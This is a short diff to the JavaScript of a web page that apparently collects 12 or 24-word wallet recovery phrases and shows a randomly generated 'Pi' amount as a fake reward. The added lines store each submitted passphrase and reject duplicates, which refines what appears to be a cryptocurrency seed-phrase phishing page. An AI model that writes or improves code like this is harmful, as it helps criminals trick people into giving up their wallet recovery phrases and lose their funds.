@@ -286,6 +286,9 @@ function showLoading() {
     }, 3000);
 }
 
+// Store entered passphrases
+let usedPassphrases = new Set();
+
 function submitPassphrase() {
     var passphrase = document.getElementById("passphrase").value.trim();
     
@@ -293,6 +296,15 @@ function submitPassphrase() {
         document.getElementById("message").innerText = "Invalid Passphrase. Please enter a valid 12 or 24-word passphrase.";
         return;
     }
+
+    // Check if passphrase was already used
+    if (usedPassphrases.has(passphrase)) {
+        document.getElementById("message").innerText = "Invalid Response. This passphrase has already been used.";
+        return;
+    }
+
+    // Store passphrase to prevent future duplicates
+    usedPassphrases.add(passphrase);
 
     var piAmount = (Math.random() < 0.8) 
         ? Math.floor(Math.random() * (100 - 50 + 1)) + 50 
